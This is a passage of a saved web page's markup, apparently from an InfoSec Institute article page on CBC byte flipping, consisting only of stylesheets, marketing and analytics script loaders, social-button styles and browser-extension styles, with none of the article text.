100%);background-image:-moz-linear-gradient(top,#b5e0f7 0,#76c7f1 100%);background-image:-webkit-linear-gradient(top,#b5e0f7 0,#76c7f1 100%);background-image:-ms-linear-gradient(top,#b5e0f7 0,#76c7f1 100%);background-image:-webkit-gradient(linear,left top,left bottom,color-stop(0,#b5e0f7),color-stop(1,#76c7f1));border:1px solid #1172c1}.home .image .image-extras{background:none;top:12px;vertical-align:top}.home .image .image-extras .image-extras-content{left:-2px;width:99%;opacity:.7}.home .image .image-extras:before{vertical-align:top}.image:hover .image-extras{-webkit-transform:none;-moz-transform:none;-o-transform:none;-ms-transform:none;transform:none;-ms-filter:none;display:block;opacity:1}.image:hover .image-extras{display:block}.social-bar{margin:5px -15px 0;overflow:hidden;padding:15px;background-image:linear-gradient(bottom,#8dcde9 50%,#8fd0ea 51%,#70b0cb 76%);background-image:-o-linear-gradient(bottom,#8dcde9 50%,#8fd0ea 51%,#70b0cb 76%);background-image:-moz-linear-gradient(bottom,#8dcde9 50%,#8fd0ea 51%,#70b0cb 76%);background-image:-webkit-linear-gradient(bottom,#8dcde9 50%,#8fd0ea 51%,#70b0cb 76%);background-image:-ms-linear-gradient(bottom,#8dcde9 50%,#8fd0ea 51%,#70b0cb 76%);background-image:-webkit-gradient(linear,left bottom,left top,color-stop(0.5,#8dcde9),color-stop(0.51,#8fd0ea),color-stop(0.76,#70b0cb));width:100%;padding:9px}#main .reading-box .button.blue:hover{color:#1172c1!important;background-image:linear-gradient(top,#76c7f1 0,#b5e0f7 100%);background-image:-o-linear-gradient(top,#76c7f1 0,#b5e0f7 100%);background-image:-moz-linear-gradient(top,#76c7f1 0,#b5e0f7 100%);background-image:-webkit-linear-gradient(top,#76c7f1 0,#b5e0f7 100%);background-image:-ms-linear-gradient(top,#76c7f1 0,#b5e0f7 100%);background-image:-webkit-gradient(linear,left top,left bottom,color-stop(0,#76c7f1),color-stop(1,#b5e0f7));border:1px solid #1172c1}.no-cssgradients .button.blue{background-color:#b5e0f7}.no-cssgradients .button.blue:hover{background-color:#76c7f1}.home #wrapper .columns{margin:0 0 0}.reading-box .box-container{overflow:hidden;float:none}.box-container .col{width:29%}.box{-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;border:#72cd2b 1px solid;overflow:hidden;z-index:0;padding:13px!important;background:#fff;float:left;margin:0 8px 5px}.box.blueborder{border:#019cdc 1px solid!important}.box h2.blue{color:#009cde!important;text-align:center;width:50%;line-height:125%!important}.box:last-child{margin-right:0}.box h2{color:#1abc8d!important;font-weight:bold}.box .image-hold{float:right;width:35%;text-align:right}.box p{text-align:center}.home .box img{width:58%}.box img{-moz-transform:rotate(-10deg);-webkit-transform:rotate(-10deg);-o-transform:rotate(-10deg);-ms-transform:rotate(-10deg);transform:rotate(-10deg);z-index:0;margin:-1px -25px 0 0;float:right;width:50%}.box img.blue-image{-moz-transform:rotate(0deg);-webkit-transform:rotate(0deg);-o-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg);margin:0;width:50%}#main .singlewidgeticon,#main .singlewidgeticon{color:#418400!important;float:left;line-height:20px;width:2em}.columns{margin:0 0 5px;overflow:hidden}#sidebar .widget{margin-bottom:22px;position:relative}.infosecicon{background:url("http://infosec.staging.wpengine.com/wp-content/uploads/logo1.png") no-repeat;height:16px;width:50px;float:left;margin-top:4px;background-size:contain}#text-5.widget div.textwidget div.bluesidebar ul{margin-left:0}.portfolio-item{box-shadow:0 0 5px #ccc!important}.portfolio-content{padding:0 15px 15px!important}.count{color:#fff;font-size:17px;font-weight:bold;padding:0 5px;line-height:100%}#categories-4 .heading{background:url("http://infosec.staging.wpengine.com/wp-content/themes/Avada/images/arrow-ul.png") no-repeat scroll 0 5px transparent;padding-left:10px}@media only screen and (max-width:800px){#space{display:none}#free,#boot_camps{float:none!important}.columns .col{float:left!important;width:28%}.box img{display:none}.blueborder .text-hold img{margin:0}.box h2.blue{width:100%}.portfolio-two-sidebar .portfolio-item{max-width:99%}}@media only screen and (max-width:640px){#space{display:none}#free,#boot_camps{float:none!important}#main .box-container .col{width:84%!important;float:none;clear:both;padding:15px;text-align:center}.portfolio-two-sidebar .portfolio-item{max-width:99%}}@media only screen and (max-width:480px){#space,#free,#boot_camps{float:none!important;display:none}.box img{display:none}#main .box-container .col{width:84%!important;float:none;clear:both;padding:15px}.box h2,.text-hold,.text-hold h2{width:100%!important;text-align:center!important}.portfolio-two-sidebar .portfolio-item{max-width:99%}}@media only screen and (max-width:320px){#space{display:none}#free,#boot_camps{float:none!important;display:none}.box img{display:none}#main .box-container .col{width:84%!important;float:none;clear:both;padding:15px}.box h2,.text-hold,.text-hold h2{width:100%!important;text-align:center!important}.portfolio-two-sidebar .portfolio-item{max-width:99%}.box img{max-width:100%;margin-top:-100px!important}}.download_files_icon{padding-left:30px;background-position:0 0;background-image:url(../images/Downloads.png);background-size:contain;background-repeat:no-repeat}.footer-area{padding:10px 10px 15px}.footer-area h3{margin:0 0 10px}.footer-area ul li{padding:5px 0}.half_wpf_download{width:45%;float:left}#sidebar .widget h3{font-size:14px!important;font-weight:bold;color:grey!important}h4 a{background:#eee;margin:2px;font-size:.8em;padding:2px 12px;-webkit-border-radius:15px;-moz-border-radius:15px;border-radius:15px;border:1px solid #e3e3e3;color:#aaa}h4 a:hover{background:#eee;margin:2px;font-size:.8em;padding:2px 12px;-webkit-border-radius:15px;-moz-border-radius:15px;border-radius:15px;border:1px solid #e3e3e3;color:#aaa}.recent_art{float:left;filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=.5);margin:auto 15px 0 0;padding:0 15px;-webkit-transition-property:all;-ms-transition-property:all;transition-property:all;-webkit-transition-duration:.4s;-ms-transition-duration:.4s;transition-duration:.4s;overflow:hidden;color:gray;border-left:3px solid #a0ce4e;background:#f2efef}#sidebar .widget li a,#sidebar .widget .recentcomments,#sidebar .widget_categories li{padding-left:5px}</style>
+<!--<style type="text/css" id="ss">
+</style>
+<link rel="stylesheet" id="style_selector_ss" href="#" />-->
+
+<script type="text/javascript">
+piAId = '13882';
+piCId = '1951';
+
+(function() {
+	function async_load(){
+		var s = document.createElement('script'); s.type = 'text/javascript';
+		s.src = ('https:' == document.location.protocol ? 'https://pi' : 'http://cdn') + '.pardot.com/pd.js';
+		var c = document.getElementsByTagName('script')[0]; c.parentNode.insertBefore(s, c);
+	}
+	if(window.attachEvent) { window.attachEvent('onload', async_load); }
+	else { window.addEventListener('load', async_load, false); }
+})();
+</script>
+
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-146509-8']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+<script src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/nonSecureAnonymousFramework"></script><style type="text/css">* html #li_ui_li_gen_1395468358091_0 a#li_ui_li_gen_1395468358091_0-link{height:1% !important;}#li_ui_li_gen_1395468358091_0{position:relative !important;overflow:visible !important;display:block !important;}#li_ui_li_gen_1395468358091_0 a#li_ui_li_gen_1395468358091_0-link{border:0 !important;height:20px !important;text-decoration:none !important;padding:0 !important;margin:0 !important;display:inline-block !important;}#li_ui_li_gen_1395468358091_0 a#li_ui_li_gen_1395468358091_0-link:link, #li_ui_li_gen_1395468358091_0 a#li_ui_li_gen_1395468358091_0-link:visited, #li_ui_li_gen_1395468358091_0 a#li_ui_li_gen_1395468358091_0-link:hover, #li_ui_li_gen_1395468358091_0 a#li_ui_li_gen_1395468358091_0-link:active{border:0 !important;text-decoration:none !important;}#li_ui_li_gen_1395468358091_0 a#li_ui_li_gen_1395468358091_0-link:after{content:"." !important;display:block !important;clear:both !important;visibility:hidden !important;line-height:0 !important;height:0 !important;}#li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-logo{background:url(http://s.c.lnkd.licdn.com/scds/common/u/img/sprite/sprite_connect_v13.png) 0px -276px no-repeat !important;cursor:pointer !important;border:0 !important;text-indent:-9999em !important;overflow:hidden !important;padding:0 !important;margin:0 !important;position:absolute !important;left:0px !important;top:0px !important;display:block !important;width:20px !important;height:20px !important;float:right !important;}#li_ui_li_gen_1395468358091_0.hovered #li_ui_li_gen_1395468358091_0-logo{background-position:-20px -276px !important;}#li_ui_li_gen_1395468358091_0.clicked #li_ui_li_gen_1395468358091_0-logo, #li_ui_li_gen_1395468358091_0.down #li_ui_li_gen_1395468358091_0-logo{background-position:-40px -276px !important;}.IN-shadowed #li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-logo{}#li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-title{color:#333 !important;cursor:pointer !important;display:block !important;white-space:nowrap !important;float:left !important;margin-left:1px !important;vertical-align:top !important;overflow:hidden !important;text-align:center !important;height:18px !important;padding:0 4px 0 23px !important;border:1px solid #000 !important;border-top-color:#E2E2E2 !important;border-right-color:#BFBFBF !important;border-bottom-color:#B9B9B9 !important;border-left-color:#E2E2E2 !important;border-left:0 !important;text-shadow:#FFFFFF -1px 1px 0 !important;line-height:20px !important;border-radius:0 !important;-webkit-border-radius:0 !important;border-top-right-radius:2px !important;border-bottom-right-radius:2px !important;-webkit-border-top-right-radius:2px !important;-webkit-border-bottom-right-radius:2px !important;background-color:#ECECEC !important;background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0%,#FEFEFE), color-stop(100%,#ECECEC)) !important; background-image: -webkit-linear-gradient(top, #FEFEFE 0%, #ECECEC 100%) !important;}#li_ui_li_gen_1395468358091_0.hovered #li_ui_li_gen_1395468358091_0-title{border:1px solid #000 !important;border-top-color:#ABABAB !important;border-right-color:#9A9A9A !important;border-bottom-color:#787878 !important;border-left-color:#04568B !important;border-left:0 !important;background-color:#EDEDED !important;background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0%,#EDEDED), color-stop(100%,#DEDEDE)) !important; background-image: -webkit-linear-gradient(top, #EDEDED 0%, #DEDEDE 100%) !important;}#li_ui_li_gen_1395468358091_0.clicked #li_ui_li_gen_1395468358091_0-title, #li_ui_li_gen_1395468358091_0.down #li_ui_li_gen_1395468358091_0-title{color:#666 !important;border:1px solid #000 !important;border-top-color:#B6B6B6 !important;border-right-color:#B3B3B3 !important;border-bottom-color:#9D9D9D !important;border-left-color:#49627B !important;border-left:0 !important;background-color:#DEDEDE !important;background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0%,#E3E3E3), color-stop(100%,#EDEDED)) !important; background-image: -webkit-linear-gradient(top, #E3E3E3 0%, #EDEDED 100%) !important;}.IN-shadowed #li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-title{}.IN-shadowed #li_ui_li_gen_1395468358091_0.hovered #li_ui_li_gen_1395468358091_0-title{}.IN-shadowed #li_ui_li_gen_1395468358091_0.clicked #li_ui_li_gen_1395468358091_0-title, .IN-shadowed #li_ui_li_gen_1395468358091_0.down #li_ui_li_gen_1395468358091_0-title{}#li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-title-text, #li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-title-text *{color:#333 !important;font-size:11px !important;font-family:Arial, sans-serif !important;font-weight:bold !important;font-style:normal !important;display:inline-block !important;background:transparent none !important;vertical-align:top !important;height:18px !important;line-height:20px !important;float:none !important;}#li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-title-text strong{font-weight:bold !important;}#li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-title-text em{font-style:italic !important;}#li_ui_li_gen_1395468358091_0.hovered #li_ui_li_gen_1395468358091_0-title-text, #li_ui_li_gen_1395468358091_0.hovered #li_ui_li_gen_1395468358091_0-title-text *{color:#000 !important;}#li_ui_li_gen_1395468358091_0.clicked #li_ui_li_gen_1395468358091_0-title-text, #li_ui_li_gen_1395468358091_0.down #li_ui_li_gen_1395468358091_0-title-text, #li_ui_li_gen_1395468358091_0.clicked #li_ui_li_gen_1395468358091_0-title-text *, #li_ui_li_gen_1395468358091_0.down #li_ui_li_gen_1395468358091_0-title-text *{color:#666 !important;}#li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-title #li_ui_li_gen_1395468358091_0-mark{display:inline-block !important;width:0px !important;overflow:hidden !important;}.success #li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-title{color:#333 !important;border-top-color:#E2E2E2 !important;border-right-color:#BFBFBF !important;border-bottom-color:#B9B9B9 !important;border-left-color:#E2E2E2 !important;background-color:#ECECEC !important;background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0%,#FEFEFE), color-stop(100%,#ECECEC)) !important; background-image: -webkit-linear-gradient(top, #FEFEFE 0%, #ECECEC 100%) !important;}.success #li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-title-text, .success #li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-title-text *{color:#333 !important;}.IN-shadowed .success #li_ui_li_gen_1395468358091_0 #li_ui_li_gen_1395468358091_0-title{}.success #li_ui_li_gen_1395468358091_0.hovered #li_ui_li_gen_1395468358091_0-title{color:#000 !important;border-top-color:#ABABAB !important;border-right-color:#9A9A9A !important;border-bottom-color:#787878 !important;border-left-color:#04568B !important;background-color:#EDEDED !important;background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0%,#EDEDED), color-stop(100%,#DEDEDE)) !important; background-image: -webkit-linear-gradient(top, #EDEDED 0%, #DEDEDE 100%) !important;}.success #li_ui_li_gen_1395468358091_0.hovered #li_ui_li_gen_1395468358091_0-title-text, .success #li_ui_li_gen_1395468358091_0.hovered #li_ui_li_gen_1395468358091_0-title-text *{color:#000 !important;}.success #li_ui_li_gen_1395468358091_0.clicked #li_ui_li_gen_1395468358091_0-title, .success #li_ui_li_gen_1395468358091_0.down #li_ui_li_gen_1395468358091_0-title{color:#666 !important;border-top-color:#B6B6B6 !important;border-right-color:#B3B3B3 !important;border-bottom-color:#9D9D9D !important;border-left-color:#49627B !important;background-color:#DEDEDE !important;background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0%,#E3E3E3), color-stop(100%,#EDEDED)) !important; background-image: -webkit-linear-gradient(top, #E3E3E3 0%, #EDEDED 100%) !important;}.success #li_ui_li_gen_1395468358091_0.clicked #li_ui_li_gen_1395468358091_0-title-text, .success #li_ui_li_gen_1395468358091_0.down #li_ui_li_gen_1395468358091_0-title-text, .success #li_ui_li_gen_1395468358091_0.clicked #li_ui_li_gen_1395468358091_0-title-text *, .success #li_ui_li_gen_1395468358091_0.down #li_ui_li_gen_1395468358091_0-title-text *{color:#666 !important;}.IN-shadowed .success #li_ui_li_gen_1395468358091_0.clicked #li_ui_li_gen_1395468358091_0-title, .IN-shadowed .success #li_ui_li_gen_1395468358091_0.down #li_ui_li_gen_1395468358091_0-title{}#li_ui_li_gen_1395468358102_1-container.IN-top {display:inline-block !important;overflow:visible !important;position:relative !important;height:42px !important;line-height:1px !important;cursor:pointer !important;}#li_ui_li_gen_1395468358102_1.IN-top {display:inline-block !important;height:42px !important;width:57px !important;text-align:center !important;background:url(http://s.c.lnkd.licdn.com/scds/common/u/img/sprite/sprite_connect_v13.png) -150px top no-repeat !important;}#li_ui_li_gen_1395468358102_1-content.IN-top {display:inline !important;font-size:16px !important;color:#04558B !important;font-weight:bold !important;font-family:Arial, sans-serif !important;line-height:34px !important;}#li_ui_li_gen_1395468358102_1-container.IN-hovered #li_ui_li_gen_1395468358102_1.IN-top, #li_ui_li_gen_1395468358102_1-container.IN-clicked #li_ui_li_gen_1395468358102_1.IN-top, #li_ui_li_gen_1395468358102_1-container.IN-down #li_ui_li_gen_1395468358102_1.IN-top {background-position-x:-210px !important;}#li_ui_li_gen_1395468358102_1-container.IN-empty #li_ui_li_gen_1395468358102_1-inner.IN-top {background:url(http://s.c.lnkd.licdn.com/scds/common/u/img/sprite/sprite_connect_v13.png) 0px -20px no-repeat !important;overflow:hidden !important;margin:5px auto 0 auto !important;width:26px !important;height:26px !important;display:block !important;}#li_ui_li_gen_1395468358102_1-container.IN-empty #li_ui_li_gen_1395468358102_1-content.IN-top {text-indent:-999px !important;display:inline-block !important;}#li_ui_li_gen_1395468358102_1-container.IN-hidden #li_ui_li_gen_1395468358102_1 {display:none !important;}</style><style id="clearly_highlighting_css" type="text/css">/* selection */ html.clearly_highlighting_enabled ::-moz-selection { background: rgba(246, 238, 150, 0.99); } html.clearly_highlighting_enabled ::selection { background: rgba(246, 238, 150, 0.99); } /* cursor */ html.clearly_highlighting_enabled {    /* cursor and hot-spot position -- requires a default cursor, after the URL one */    cursor: url("chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/images/highlight--cursor.png") 14 16, text; } /* highlight tag */ em.clearly_highlight_element {    font-style: inherit !important; font-weight: inherit !important;    background-image: url("chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/images/highlight--yellow.png");    background-repeat: repeat-x; background-position: top left; background-size: 100% 100%; } /* the delete-buttons are positioned relative to this */ em.clearly_highlight_element.clearly_highlight_first { position: relative; } /* delete buttons */ em.clearly_highlight_element a.clearly_highlight_delete_element {    display: none; cursor: pointer;    padding: 0; margin: 0; line-height: 0;    position: absolute; width: 34px; height: 34px; left: -17px; top: -17px;    background-image: url("chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/images/highlight--delete-sprite.png"); background-repeat: no-repeat; background-position: 0px 0px; } em.clearly_highlight_element a.clearly_highlight_delete_element:hover { background-position: -34px 0px; } /* retina */ @media (min--moz-device-pixel-ratio: 2), (-webkit-min-device-pixel-ratio: 2), (min-device-pixel-ratio: 2) {    em.clearly_highlight_element { background-image: url("chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/images/highlight--yellow@2x.png"); }    em.clearly_highlight_element a.clearly_highlight_delete_element { background-image: url("chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/images/highlight--delete-sprite@2x.png"); background-size: 68px 34px; } } </style><style>[touch-action="none"]{ -ms-touch-action: none; touch-action: none; }[touch-action="pan-x"]{ -ms-touch-action: pan-x; touch-action: pan-x; }[touch-action="pan-y"]{ -ms-touch-action: pan-y; touch-action: pan-y; }[touch-action="scroll"],[touch-action="pan-x pan-y"],[touch-action="pan-y pan-x"]{ -ms-touch-action: pan-x pan-y; touch-action: pan-x pan-y; }</style><style type="text/css">#lleo_dialog, #lleo_dialog * {
+    margin: 0 !important;
+	padding: 0 !important;
+	background: none !important;
+	border: none 0 !important;
+	position: static !important;
+	vertical-align: baseline !important;
+	font: normal 13px Arial, Helvetica !important;
+	line-height: 15px !important;
+	color: #000 !important;
+	overflow: visible !important;
+	width: auto !important;
+	height: auto !important;
+	float: none !important;
+	visibility: visible !important;
+	text-align: left !important;
+	border-collapse: separate !important;
+	border-spacing: 2px !important;
+}
+
+#lleo_dialog iframe {
+	height: 0 !important;
+	width: 0 !important;
+}
+
+#lleo_dialog {
+    position: absolute !important;
+    background: #fff !important;
+    border: solid 1px #ccc !important;
+    padding: 7px 0 0 !important;
+    left: -999px;
+    top: -999px;
+	/*max-width: 450px !important;*/
+    width: 440px !important;
+    overflow: hidden;
+    display: block !important;
+    z-index: 999999999 !important;
+    opacity: 0 !important;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.18) !important;
+	-moz-border-radius: 3px !important;
+	-webkit-border-radius: 3px !important;
+	border-radius: 3px !important;
+}
+#lleo_dialog.lleo_show {
+    opacity: 1 !important;
+    -webkit-transition: opacity 0.3s !important;
+}
+#lleo_dialog input::-webkit-input-placeholder {
+    color: #aaa !important;
+}
+#lleo_dialog .lleo_has_pic #lleo_word {
+	margin-right: 80px !important;
+}
+#lleo_dialog #lleo_translationsCopntainer1 {
+	position: relative !important;
+}
+#lleo_dialog #lleo_translationsCopntainer2 {
+	padding: 7px 0 0 !important;
+	vertical-align: middle !important;
+}
+#lleo_dialog #lleo_word {
+    color: #000 !important;
+    margin: 0 5px 2px 0 !important;
+    /*float: left !important;*/
+}
+#lleo_dialog .lleo_has_sound #lleo_word {
+    margin-left: 17px !important;
+}
+#lleo_dialog #lleo_text {
+    font-weight: bold !important;
+    color: #d56e00 !important;
+    text-decoration: none !important;
+    cursor: default !important;
+}
+#lleo_dialog #lleo_text.lleo_known {
+    cursor: pointer !important;
+    text-decoration: underline !important;
+}
+#lleo_dialog #lleo_closeBtn {
+    position: absolute !important;
+    right: 6px !important;
+    top: 5px !important;
+    line-height: 1px !important;
+    text-decoration: none !important;
+    font-weight: bold !important;
+    font-size: 0 !important;
+    color: #aaa !important;
+    display: block !important;
+    padding: 2px !important;
+	z-index: 9999999999 !important;
+	width: 7px !important;
+	height: 7px !important;
+	padding: 0  !important;
+	margin: 0   !important;
+}
+
+#lleo_dialog #lleo_optionsBtn {
+    position: absolute !important; 
+    right: 1px !important;
+    top: 12px !important;
+    line-height: 1px !important;
+    text-decoration: none !important;
+    font-weight: bold !important;
+    font-size: 13px !important;
+    color: #aaa !important;
+    padding: 2px !important;
+	display: none;
+}
+#lleo_dialog #lleo_optionsBtn img{
+	width: 12px !important;
+	height: 12px !important;
+}
+#lleo_dialog #lleo_sound {
+    float: left !important;
+    width: 16px !important;
+    height: 16px !important;
+    margin-left: 12px !important;
+    background: 0 0 no-repeat !important;
+    cursor: pointer !important;
+    display: none !important;
+}
+#lleo_dialog .lleo_has_sound #lleo_sound {
+    display: block !important;
+}
+#lleo_dialog #lleo_picOuter {
+    position: absolute !important;
+    float: right !important;
+    right: 29px;
+    top: 0;
+    display: none !important;
+    z-index: 9 !important;
+}
+#lleo_dialog .lleo_has_pic #lleo_picOuter {
+    display: block !important;
+}
+#lleo_dialog #lleo_picOuter:hover {
+    z-index: 11 !important;
+}
+#lleo_dialog #lleo_pic,
+#lleo_dialog #lleo_picBig {
+    position: absolute !important;
+    top: 0 !important;
+    right: 0 !important;
+    border: solid 2px #fff !important;
+    -moz-border-radius: 2px !important;
+	-webkit-border-radius: 2px !important;
+	border-radius: 2px !important;
+    z-index: 1 !important;
+}
+#lleo_dialog #lleo_pic {
+	position: relative !important;
+    border: none !important;
+	width: 34px !important;
+}
+#lleo_dialog #lleo_picBig {
+    box-shadow: -1px 2px 4px rgba(0,0,0,0.3);
+    z-index: 2 !important;
+    opacity: 0 !important;
+    visibility: hidden !important;
+}
+#lleo_dialog #lleo_picOuter:hover #lleo_picBig {
+    visibility: visible !important;
+    opacity: 1 !important;
+    -webkit-transition: opacity 0.3s !important;
+    -webkit-transition-delay: 0.3s !important;
+}
+#lleo_dialog #lleo_transcription {
+    color: #486D85 !important;
+    margin: 0 0 4px 29px !important;
+    color: #aaaaaa !important;
+}
+#lleo_dialog .lleo_no_trans {
+    color: #aaa !important;
+}
+
+
+
+
+
+
+#lleo_dialog .ll-translation-counter {
+	float: right !important;
+    font-size: 11px !important;
+    color: #aaa !important;
+    padding: 2px 2px 1px 10px !important;
+}
+
+#lleo_dialog .ll-translation-text {
+	float: left !important;
+	width: 80% !important;
+}
+
+#lleo_dialog #lleo_trans a {
+    color: #3F669F !important;
+    padding: 1px 4px !important;
+    text-decoration: none !important;
+    text-overflow: ellipsis !important;
+    overflow: hidden !important;
+}
+
+#lleo_dialog .ll-translation-item {
+	width: 100% !important;
+	float: left !important; 
+	padding:1px 4px;
+	color: #3F669F !important;
+	padding: 3px !important;
+	border: solid 1px white !important;
+	-moz-border-radius: 2px !important;
+	-webkit-border-radius: 2px !important;
+	border-radius: 2px !important;
+}
+
+#lleo_dialog .ll-translation-item:hover {
+	border: solid 1px #9FC2C9 !important;
+    background: #EDF4F6 !important;
+	cursor: pointer !important;
+}
+
+#lleo_dialog .ll-translation-marker {
+	margin: 0px 5px 2px 2px !important;
+}
+
+
+
+
+
+#lleo_dialog #lleo_icons {
+    margin: 10px 0 7px !important;
+    color: #aaa !important;
+    line-height: 20px !important;
+    font-size: 11px !important;
+    clear: both !important;
+    padding-left: 16px !important;
+}
+#lleo_icons a {
+    display: inline-block !important;
+    width: 16px !important;
+    height: 16px !important;
+    margin: 0 0 -2px 3px !important;
+    text-decoration: none !important;
+    background: 0 0 no-repeat !important;
+    opacity: 0.5 !important;
+}
+#lleo_icons a:hover {
+    opacity: 1 !important;
+}
+#lleo_icons a.lleo_google     {background-position:-34px 0 !important;}
+#lleo_icons a.lleo_multitran  {background-position:-64px 0 !important;}
+#lleo_icons a.lleo_lingvo     {background-position:-51px 0 !important; width: 12px !important;}
+#lleo_icons a.lleo_dict       {background-position:-17px 0 !important;}
+#lleo_icons a.lleo_linguee    {background-position:-81px 0 !important;}
+#lleo_icons a.lleo_michaelis  {background-position:-98px 0 !important;}
+
+
+
+
+#lleo_dialog #lleo_contextContainer {
+    margin: 0 !important;
+    padding: 3px 15px 3px 10px !important;
+    background: -webkit-gradient(linear, left top, left bottom, from(#fff), to(#eee)) !important;
+    border-bottom: solid 1px #ddd !important;
+    border-top-left-radius: 3px !important;
+    border-top-right-radius: 3px !important;
+    display: none !important;
+    overflow: hidden !important;
+}
+#lleo_dialog .lleo_has_context #lleo_contextContainer {
+    display: block !important;
+}
+#lleo_dialog #lleo_context {
+    color: #444 !important;
+    text-shadow: 1px 1px 0 #f4f4f4 !important;
+    line-height: 12px !important;
+    font-size: 11px !important;
+    margin-left: 2px !important;
+}
+#lleo_dialog #lleo_context b {
+    line-height: 12px !important;
+    color: #000 !important;
+    font-weight: bold !important;
+    font-size: 11px !important;
+}
+#lleo_dialog #lleo_gBrand {
+    color: #aaa !important;
+    font-size: 10px !important;
+    /*padding-right: 52px !important;*/
+    padding-bottom: 14px !important;
+    margin: -3px 4px 0 4px !important;
+    background: left bottom no-repeat !important;
+    display: inline-block !important;
+    float: right !important;
+}
+#lleo_dialog #lleo_gBrand.hidden {
+    display: none !important;
+}
+#lleo_dialog #lleo_translateContextLink {
+    color: #444 !important;
+    text-shadow: 1px 1px 0 #f4f4f4 !important;
+    background: -webkit-gradient(linear, left top, left bottom, from(#f4f4f4), to(#ddd)) !important;
+    border: solid 1px !important;
+    box-shadow: 1px 1px 0 #f6f6f6 !important;
+    border-color: #999 #aaa #aaa #999 !important;
+    -moz-border-radius: 2px !important;
+	-webkit-border-radius: 2px !important;
+	border-radius: 2px !important;
+    padding: 0 3px !important;
+    font-size: 11px !important;
+    text-decoration: none !important;
+    margin: 1px 5px 0 !important;
+    display: inline-block !important;
+    white-space: nowrap !important;
+}
+#lleo_dialog #lleo_translateContextLink:hover {
+    background: #f8f8f8 !important;
+}
+
+#lleo_dialog #lleo_setTransForm {
+    display: block !important;
+    margin-top: 3px !important;
+    padding-top: 5px !important;
+    /* Set position and background because the form might be overlapped by an image when no translations */
+    position: relative !important;
+    background: #fff !important;
+    z-index: 10 !important;
+    padding-bottom: 10px !important;
+    padding-left: 16px !important;
+}
+#lleo_dialog .lleo-custom-translation {
+    padding: 4px 5px !important;
+    border: solid 1px #ddd !important;
+    -moz-border-radius: 2px !important;
+	-webkit-border-radius: 2px !important;
+	border-radius: 2px !important;
+    width: 90% !important;
+    min-width: 270px !important;
+    background: -webkit-gradient(linear, 0 0, 0 20, from(#f1f1f1), to(#fff)) !important;
+	font: normal 13px Arial, Helvetica !important;
+	line-height: 15px !important;
+}
+#lleo_dialog .lleo-custom-translation:hover {
+    border: solid 1px #aaa !important;
+}
+#lleo_dialog .lleo-custom-translation:focus {
+    background: #FFFEC9 !important;
+}
+
+#lleo_dialog *.hidden {
+    display: none !important;
+}
+
+#lleo_dialog .infinitive{
+    color: #D56E00 !important;
+    text-decoration: none;
+    border-bottom: 1px dotted #D56E00 !important;
+}
+#lleo_dialog .infinitive:hover{
+    border: none !important;
+}
+
+
+#lleo_dialog #lleo_trans{
+    zoom: 1;
+    border-top: 1px solid #eeeeee !important;
+    margin: 10px 0 0 !important;
+    padding: 5px 30px 0 14px !important;
+}
+
+#lleo_dialog .lleo_clearfix {
+	display: block !important;
+	clear: both !important;
+	visibility: hidden !important;
+	height: 0 !important;
+	font-size: 0 !important;
+}
+
+#lleo_dialog #lleo_markBlock {
+    background: #eeeeee !important;
+	cursor: pointer !important; 
+	border-bottom-left-radius: 3px !important;
+	border-bottom-right-radius: 3px !important;
+	border-collapse: separate !important;
+	border-spacing: 2px !important; 
+}
+
+#lleo_dialog #lleo_markBlock img{
+	width: 14px !important;
+	height: 14px !important;
+}
+
+#lleo_dialog #lleo_markBlock .icon-cell {
+	padding: 5px 2px 5px 16px !important;
+	height: 17px !important;
+}
+
+#lleo_dialog #lleo_markBlock .wide-cell {
+	width: 100% !important;
+}
+
+#lleo_dialog #lleo_markBlock .text-cell {
+	color: #999999 !important; 
+    font: normal 13px Arial, Helvetica !important;
+    text-shadow: 0 1px #fff !important; 
+}
+
+#lleo_dialog #lleo_markBlock td {
+	vertical-align: middle !important;
+	border-collapse: separate !important;
+	border-spacing: 2px !important;
+}
+
+
+#lleo_dialog #lleo_picOuter table{
+    width: 44px !important;
+    position: absolute !important;
+    right: 0 !important;
+    vertical-align: middle !important;
+}
+
+#lleo_dialog #lleo_picOuter td{
+    width: 38px !important;
+    height: 38px !important;
+    border: 1px solid #eeeeee !important;
+    vertical-align: middle !important;
+    text-align: center !important;
+}
+
+#lleo_dialog #lleo_picOuter td div {
+	height: 38px !important;
+	overflow: hidden !important;
+}</style><style type="text/css">
+.ll-content-notification *{
+	letter-spacing: normal !important;
+	margin: 0 !important;
+    padding: 0 !important;
+	background: none !important;
+	border: 0 !important;
+	float: none !important;
+	text-align: left !important;
